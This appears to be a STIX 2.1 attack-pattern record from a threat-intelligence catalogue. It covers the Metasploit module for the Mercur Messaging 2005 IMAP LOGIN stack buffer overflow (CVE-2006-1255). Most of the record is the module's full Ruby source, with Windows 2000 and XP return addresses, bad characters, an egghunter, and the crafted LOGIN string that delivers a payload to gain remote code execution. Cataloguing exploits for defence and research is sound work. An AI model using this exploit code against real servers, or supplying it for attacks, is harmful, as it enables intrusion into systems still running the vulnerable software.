{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a6ec3a54-38aa-4bb3-a7b5-1260a93f45b9",
    "created": "2024-08-14T16:47:38.031805Z",
    "modified": "2024-08-14T16:47:38.031809Z",
    "name": "Mercur Messaging 2005 IMAP Login Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Atrium Mercur IMAP 5.0 SP3. Since the room for shellcode is small, using the reverse ordinal payloads yields the best results. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/imap/mercur_login.rb",
            "external_id": "mercur_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-1255"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/fulldisclosure/2006-03/1104.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mercur Messaging 2005 IMAP Login Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Atrium Mercur IMAP 5.0 SP3.\n        Since the room for shellcode is small, using the reverse ordinal payloads\n        yields the best results.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-1255' ],\n          [ 'OSVDB', '23950' ],\n          [ 'BID', '17138' ],\n          [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2006-03/1104.html' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 228,\n          'BadChars' => \"\\x00\\x20\\x2c\\x3a\\x40\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x7c2ec68b } ],\n          [ 'Windows XP Pro SP2 English',   { 'Ret' => 0x77dc15c0 } ],\n        ],\n      'DisclosureDate' => '2006-03-17',\n      'DefaultTarget'  => 0))\n\n    register_options( [ Opt::RPORT(143) ])\n  end\n\n  def exploit\n    connect\n    sock.get_once\n\n    hunter  = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n    egg     = hunter[1]\n\n    sploit\t=  \"A001 LOGIN \" + egg + hunter[0]\n    sploit\t<< [target.ret].pack('V') + [0xe9, -175].pack('CV')\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit + \"\\r\\n\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-03-17",
    "x_mitre_platforms": [
        "win'"
    ]
}